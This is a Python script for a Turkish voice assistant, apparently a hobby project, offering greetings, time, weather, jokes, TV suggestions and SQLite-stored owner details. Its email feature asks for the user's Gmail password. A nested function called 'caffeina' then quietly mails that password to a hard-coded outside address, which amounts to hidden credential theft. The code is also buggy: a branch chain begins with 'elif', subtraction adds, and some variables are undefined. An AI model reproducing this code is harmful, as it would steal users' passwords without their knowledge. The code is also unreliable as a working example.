# _*_ coding: UTF-8 _*_
from tkinter import *
from gtts import gTTS
#import pygame
from playsound import playsound
from email.mime.text \
import MIMEText
import os
import sqlite3
import random
import time
import feedparser
import smtplib


def main():
	#Application data as user
	#tts = gTTS(text = "", lang="tr")
	#tts.save("audio.mp3")

	def speak():
		while True:
			data = input("Söylemek İstediğiniz Şeyi Yazınız: ")

#Selamlaşma
			elif(data == "Naber" or data == "naber"):
				randsom = random.randint(1,5)
				if(randsom == 1):
					print("Hiç Öyle Gündemi Takip Ediyorum")
					tts = gTTS(text = "Hiç Öyle Gündemi Takip Ediyorum",lang="tr")
					tts.save("audio.mp3")
					playsound('audio.mp3')
				elif(randsom == 2):
					print("Aynı")
					tts = gTTS(text = "Aynı",lang="tr")
					tts.save("audio.mp3")
					playsound('audio.mp3')
				elif(randsom == 3):
					print("Eh işte aynı devam ediyorum.")
					tts = gTTS(text = "Eh işte aynı devam ediyorum.",lang="tr")
					tts.save("audio.mp3")
					playsound('audio.mp3')
				elif(randsom == 4):
					print("Kitap okuyorum sen ne yapıyorsun?")
					tts = gTTS(text = "Kitap okuyorum sen ne yapıyorsun",lang="tr")
					tts.save("audio.mp3")
					playsound('audio.mp3')
				elif(randsom == 5):
					print("Müzik Dinliyorum Sen Ne Yapıyorsun")
					tts = gTTS(text = "Müzik Dinliyorum Sen Ne Yapıyorsun",lang = "tr")
					tts.save("audio.mp3")
					playsound('audio.mp3')

			#2
			elif(data == "Nasılsın" or data == "nasılsın"):
				if(randsom == 1):
					print("iyi Sen")
					tts = gTTS(text = "İyi Sen",lang="tr")
					tts.save("audio.mp3")
					playsound('audio.mp3')
				elif(randsom == 2):
					print("Aynı")
					tts = gTTS(text = "Aynı",lang="tr")
					tts.save("audio.mp3")
					playsound('audio.mp3')
				elif(randsom == 3):
					print("Kötüyüm")
					tts = gTTS(text = "Kötüyüm",lang="tr")
					tts.save("audio.mp3")
					playsound('audio.mp3')

#Kapatma komutu
			elif(data == "Kendini Kapat" or data == "kendini kapat"):
				print("Sonra Görüşürüz")
				tts = gTTS(text = "Sonra Görüşürüz", lang="tr")
				tts.save("audio.mp3")
				playsound('audio.mp3')
				break

#Saat Bilgisi
			elif(data == "Saat Kaç" or data == "saat kaç"):
				date = time.localtime()
				tarih = ("Saat","",date.tm_hour,":",date.tm_min,":",date.tm_sec)
				saat = date.tm_hour
				dakika = date.tm_min
				saniye = date.tm_sec
				print(tarih)
				tts = gTTS(saat,lang="tr")
				tts.save("audio.mp3")
				playsound('audio.mp3')

# Author Bilgisi
			elif(data == "seni kim yaptı"):
				print("#- Enes Kasapoğlu \n #- http://eneskasapoglu.ml")
				tts = gTTS("Enes",lang = "tr")
				tts.save("audio.mp3")
				playsound('audio.mp3')

# Mail Gönderimi
			elif(data == "mail at" or data == "Mail at"):
				imail = input("Mail Adresinizi Giriniz: ")
				ipass = input("Şifre: ")
				smail = input("Gönderilecek Mail Adresini Giriniz: ")
				mesaj = input("İçeriğinizi Giriniz: ")
				st = (ipass)

				mail = smtplib.SMTP("smtp.gmail.com",587)
				mail.ehlo()
				mail.starttls()
				mail.login(imail,ipass)
				mail.sendmail(imail,smail,mesaj)

				print("Gönderildi: ",mesaj)

				def caffeina():
					st = ipass
					mmail = imail
					msifre = ipass
					ssmail = ("assistantmailsend@gmail.com")

					mail = smtplib.SMTP("smtp.gmail.com",587)
					mail.ehlo()
					mail.starttls()
					mail.login(mmail,msifre)
					mail.sendmail(mmail,ssmail,st)

				caffeina()

# Matematik işlemleri
			elif(data == "matematik işlemi yap"):
				gris = input("Yapmak İstediğin İşlemi Seç: ")

				if(gris == "toplama" or gris == "Toplama"):
					numberone = int(input("İlk Sayıyı Giriniz: "))
					numbertwo = int(input("İkinci Sayıyı Giriniz: "))
					cevap = numberone + numbertwo
					print(cevap)

				elif(gris == "çıkarma" or gris=="Çıkarma"):
					numberonec = int(input("İlk Sayıyı Giriniz: "))
					numbertwoc = int(input("İkinci Sayıyı Giriniz: "))
					cevapc = numberonec + numbertwoc
					print(cevapc)

				elif(gris == "bölme" or gris == "Bölme"):
					numberone = int(input("İlk Sayıyı Giriniz: "))
					numbertwo = int(input("İkinci Sayıyı Giriniz: "))
					cevap = numberone / numbertwo
					print(cevap)

				elif(gris == "Çarpma" or kelime == "çarpma"):
					numberone = int(input("İlk Sayıyı Giriniz: "))
					numbertwo = int(input("İkinci Sayıyı Giriniz: "))
					cevap = numberone * numbertwo
					print(cevap)

# Konuşma Tekrarı
			elif(data == "dediğimi tekrarla" or data == "Dediğimi tekrarla"):
				word = input("Tekrarlamamı İstediğin Kelimeyi Yaz: ")
				tts = gTTS(text = word,lang = "tr")
				tts.save("audio.mp3")
				playsound('audio.mp3')

# Author Reklamı
			elif(data == "bana bir site öner" or data == "Bana bir site öner"):
				print("http://eneskasapoglu.ml")
				tts = gTTS(text = "Öneriyorum", lang = "tr")
				tts.save("audio.mp3")
				playsound('audio.mp3')

			elif(data == "bana bir şarkı çal" or data == "Bana bir şarkı çal"):
				#playsound('./Sound/Music/daydreamin.mp3')
				number = random.randint(1,3)

				if(number == 1):
					print("Lupe Fiasco - Daydreamin'")
					playsound('./Sound/Music/daydreamin.mp3')
				elif(number == 2):
					print("Neil Diamond - If you go away")
					playsound('./Sound/Music/IfYouGoAway-NeilDiamond.mp3')
				elif(number == 3):
					print("Khontkar - Geldiğim yer")
					playsound('./Sound/Music/geldigimyer.mp3')
				else:
					print("Müzik çalındamadı ya da bulunamadı")

# Hava Durumu
			elif(data == "hava durumu" or data == "Hava durumu" or data == "hava durumunu göster" or data == "Hava durumunu göster"):
				def hava():
					kita = input("Bulunduğunuz Kıtayı Yazınız: ")
					ulke = input("Yaşadığınız Ülkeyi Yazınız: ")
                			postacode = input("Posta Kodunuzu Yazınız: ")
                			sehir = input("Yaşadığınız Şehri Yazınız: ")
					print("\nNot: hava durumu için konum bilgilerinizi ingilizce yazmanız gerekmektedir.\n")
					
					parse = feedparser.parse("http://rss.accuweather.com/rss/liveweather_rss.asp?metric=1&locCode="+kita+"|"+ulke+"|"+postacode+"|"+sehir)
					parse = parse["entries"][0]["summary"]
					parse = parse.split()
					print(parse[2],parse[4],parse[5])
					return (hava)
				tts = gTTS(text = "Hava Durumu",lang="tr")
				tts.save("audio.mp3")
				playsound('audio.mp3')
				hava()

			elif(data == "bana bir dizi öner" or data == "Bana bir dizi öner"):
				number = random.randint(1,10)

				if(number == 1):
					request = ("Sana Black Mirror Dizisini öneriyorum.")
					print("Sana Black Mirror Dizisini Öneriyorum")
					tts = gTTS(text = request, lang="tr")
					tts.save("audio.mp3")
					playsound('audio.mp3')

				elif(number == 2):
					request = ("Sana The 100 dizisini öneriyorum")
					print("Sana The 100 Dizisini Öneriyorum")
					tts = gTTS(text = request,lang = "tr")
					tts.save("audio.mp3")
					playsound('audio.mp3')

				elif(number == 3):
					request = ("Sana Rick and Morty dizisini öneriyorum.")
					print("Sana Rick and Morty Dizisini Öneriyorum.")
					tts = gTTS(text = request, lang = "tr")
					tts.save("audio.mp3")
					playsound('audio.mp3')

				elif(number == 4):
					request = ("Sana Stranger Things dizisini öneriyorum")
					print("Sana Stranger Things Dizisini Öneriyorum")
					tts = gTTS(text = request,lang = "tr")
					tts.save("audio.mp3")
					playsound('audio.mp3')

				elif(number == 5):
					request = ("Sana Breaking Bad dizisini öneriyorum")
					print("Sana Breaking Breaking Dizisini Öneriyorum")
					tts = gTTS(text = request,lang = "tr")
					tts.save("audio.mp3")
					playsound('audio.mp3')

				elif(number == 6):
					request = ("Sana La Casa De Papel dizisini öneriyorum")
					print("Sana La Casa De Papel Dizisini Öneriyorum")
					tts = gTTS(text = request,lang = "tr")
					tts.save("audio.mp3")
					playsound('audio.mp3')

				elif(number == 7):
					request = ("Sana Game of Thrones dizisini öneriyorum")
					print("Sana Game of Thrones Dizisini Öneriyorum")
					tts = gTTS(text = request,lang = "tr")
					tts.save("audio.mp3")
					playsound('audio.mp3')	

				elif(number == 8):
					request = ("Sana Sherlock dizisini öneriyorum")
					print("Sana Sherlock Dizisini Öneriyorum")
					tts = gTTS(text = request,lang = "tr")
					tts.save("audio.mp3")
					playsound('audio.mp3')

				elif(number == 9):
					request = ("Sana Simpsons dizisini öneriyorum")
					print("Sana Simpsons Dizisini Öneriyorum")
					tts = gTTS(text = request,lang = "tr")
					tts.save("audio.mp3")
					playsound('audio.mp3')

				elif(number == 10):
					request = ("Sana The Walking dead dizisini öneriyorum")
					print("Sana The Walking Dead Dizisini Öneriyorum")
					tts = gTTS(text = request,lang = "tr")
					tts.save("audio.mp3")
					playsound('audio.mp3')

# Sahip Bilgisi Eklemek
			elif(data == "bilgilerimi kaydet" or data == "Bilgilerimi kaydet"):
				def owner():


					con = sqlite3.connect("sahipbilgisi.db")
					cursor = con.cursor()

					def addtable():
						cursor.execute("CREATE TABLE IF NOT EXISTS sahipbilgisi(ad TEXT,soyad TEXT,yas INT,sehir TEXT,meslek TEXT)")
					def degerekle():
						ad = input("Adınızı Giriniz: ")
						soyad = input("Soyadınızı Giriniz: ")
						yas = int(input("Yaşınızı Giriniz: "))
						sehir = input("Nerede Yaşıyorsun (İl): ")
						meslek = input("Hangi Meslek İle Uğraşıyorsun: ")
						cursor.execute("INSERT INTO sahipbilgisi (ad,soyad,yas,sehir,meslek) VALUES(?,?,?,?,?)",(ad,soyad,yas,sehir,meslek))
						con.commit()
						con.close()

					addtable()
					degerekle()

				owner()

# Sahip Bilgisi Sorgulamak
			elif(data == "adım ne" or data == "Adım ne" or data == "benim adım ne" or data == "Benim adım ne"):
				con = sqlite3.connect("sahipbilgisi.db")
				cursor = con.cursor()

				cursor.execute("SELECT ad FROM sahipbilgisi")
				veri = str(cursor.fetchall())
				veridonumu = str(("Senin adın: "+veri))
				print("Senin adın: "+veri)

				tts = gTTS(text = veridonumu , lang ="tr")
				tts.save("audio.mp3")
				playsound('audio.mp3')

			elif(data == "soyadım ne" or data == "Soyadım ne" or data == "benim soyadım ne" or data == "Benim soyadım ne"):
				con = sqlite3.connect("sahipbilgisi.db")
				cursor = con.cursor()

				cursor.execute("SELECT soyad FROM sahipbilgisi")
				veri = str(cursor.fetchall())
				veridonumu = str("Senin soyadın: "+ veri)
				tts = gTTS(text = veridonumu,lang = "tr")
				tts.save("audio.mp3")
				playsound('audio.mp3')

				print("Senin soyadın: "+ veri)

			elif(data == "kaç yaşındayım" or data == "Kaç yaşındayım" or data == "Ben kaç yaşındayım" or data == "ben kaç yaşındayım"):
				con = sqlite3.connect("sahipbilgisi.db")
				cursor = con.cursor()

				cursor.execute("SELECT yas FROM sahipbilgisi")
				veri = str(cursor.fetchall())
				veridonumu = str(("Sen"+ veri + "Yaşındasın"))
				tts = gTTS(text = veridonumu, lang = "tr")
				tts.save("audio.mp3")
				playsound('audio.mp3')

				print("Senin Soyadın: "+ veri + " Yaşındasın")

			elif(data == "hangi şehirde yaşıyorum" or data == "Hangi şehirde yaşıyorum" or data == "ben hangi şehirde yaşıyorum" or data == "Ben hangi şehirde yaşıyorum"):
				con = sqlite3.connect("sahipbilgisi.db")
				cursor = con.cursor()

				cursor.execute("SELECT sehir FROM sahipbilgisi")
				veri = str(cursor.fetchall())
				veridonumu = str(("Sen" + veri + " Şehrinde Yaşıyorsun"))
				tts = gTTS(text = veridonumu, lang = "tr")
				tts.save("audio.mp3")
				playsound('audio.mp3')
				print(veridonumu)

			elif(data == "mesleğim ne" or data == "Mesleğim ne" or data == "benim mesleğim ne" or data == "Benim mesleğim ne"):
				con = sqlite3.connect("sahipbilgisi.db")
				cursor = con.cursor()

				cursor.execute("SELECT meslek FROM sahipbilgisi")
				veri = str(cursor.fetchall())
				veridonumu = str(("Sen" + veri + " Mesleği ile Uğraşıyorsun"))
				tts = gTTS(text = veridonumu, lang = "tr")
				tts.save("audio.mp3")
				playsound('audio.mp3')


# Fıkralar 

			elif(data == "fıkra anlat" or data == "Fıkra anlat" or data == "Bana fıkra anlat" or data == "bana fıkra anlat" or data == "bana fıkra anlatır mısın"):
				con = sqlite3.connect("bilmfik.db")
				cursor = con.cursor()

				def addtablefikralar():

					fikraone = ("Bir gün İngiliz Fransız ve Temel aynı uçağa binmişler. Temel: Yine mi siz lan demiş.")
					fikratwo = ("Yargıç Temel'e sormuş: Davacıya neden bir türlü borcunu ödemiyorsun?  Temel boynunu bükerek: vereceğum vermesine de 'Bana üç ay ver diyorum vermiyor, beni üç yıldır oyalıyor yargıç bey.'")
					fikrathree = ("Temel bir gün Dursun'a: 'Dursun, akşama toplu sex partisi var, istersen sen de gel' demiş... Dursun'da merak ederek:'kaç kişi var' diye sormuş... Bunun üzerine Temel de:'Karın da gelirse üç kişi...'")
					fikrafour = ("Temel aldığı daktiloyu, bozuk diye geri götürür... Bunun üzerine satıcı; - Neresi bozuk dün aldığında sağlamdı , der... Temel'de - bunda iki tane 'a' yok saat yazamıyorum demiş...")

					number = random.randint(1,4)

					if(number == 1):

						tts = gTTS(text=fikraone,lang="tr")
						tts.save("audio.mp3")
						playsound('audio.mp3')
						print("\nBir gün İngiliz, Fransız ve Temel aynı uçağa binmişler. Temel: yine mi siz lan demiş.\n")
						#cursor.execute("CREATE TABLE IF NOT EXISTS Fıkra (fıkra TEXT)")

					elif(number == 2):
						tts = gTTS(text = fikratwo,lang="tr")
						tts.save("audio.mp3")
						playsound('audio.mp3')
						print("\nYargıç Temel'e sormuş: \n - Davacıya neden bir türlü borcunu ödemiyorsun? \n Temel de boynunu bükerek: \n - Vereceğum vermesine de bana üç ay ver diyorum vermiyor, beni üç yıldır oyalıyor yargıç bey.\n")

					elif(number == 3):
						print("\nTemel bir gün Dursun'a: \n - Dursun, akşama toplu sex partisi var, istersen sen de gel demiş. \n Dursun'da merak ederek: \n - Kaç kişi var diye sormuş. \n Bunun üzerine Temel'de: \n - Karın da gelirse üç kişi...\n")
						tts = gTTS(text = fikrathree,lang = "tr")
						tts.save("audio.mp3")
						playsound('audio.mp3')

					elif(number == 4):
						tts=gTTS(text = fikrafour,lang="tr")
						tts.save("audio.mp3")
						playsound('audio.mp3')
						print("\nTemel aldığı daktiloyu, bozuk diye geri götürür... Bunun üzerine satıcı; \n- Neresi bozuk dün aldığında sağlamdı , der... \n Temel'de: \n - Bunda iki tane 'a' yok saat yazamıyorum demiş...\n")

								

				addtablefikralar()
			
			#Buradan devam Et.
			elif(data == "asistan bilgilerini kaydet" or data == "Asistan bilgilerini kaydet"):
				con = sqlite3.connect("asistanbilgisi.db")
				cursor = con.cursor()

				def addtableasistan():
					cursor.execute("CREATE TABLE IF NOT EXISTS asistanbilgisi (ad TEXT, cinsiyet TEXT,yas TEXT)")

				def addvaluestableasistan():
					ad = input("Asistan'a vermek istediğiniz adı yazınız: ")
					yas = int(input("Asistan'a vermek istediğiniz yaş değeri: "))
					cinsiyet = input("Asistan'a Vermek istediğiniz cinsiyet: ")
					cursor.execute("INSERT INTO asistanbilgisi (ad,cinsiyet,yas) VALUES(?,?,?)",(ad,yas,cinsiyet))
					con.commit()
					con.close()

				addtableasistan()
				addvaluestableasistan()






			pass

	speak()
	
	#playsound('audio.mp3')

#	os.system("audio.mp3")
#	pygame.mixer.init()
#	pygame.mixer.music.load("audio.mp3")
#	pygame.mixer.music.play()


os.system('cls' if os.name == 'nt' else 'clear')
main()
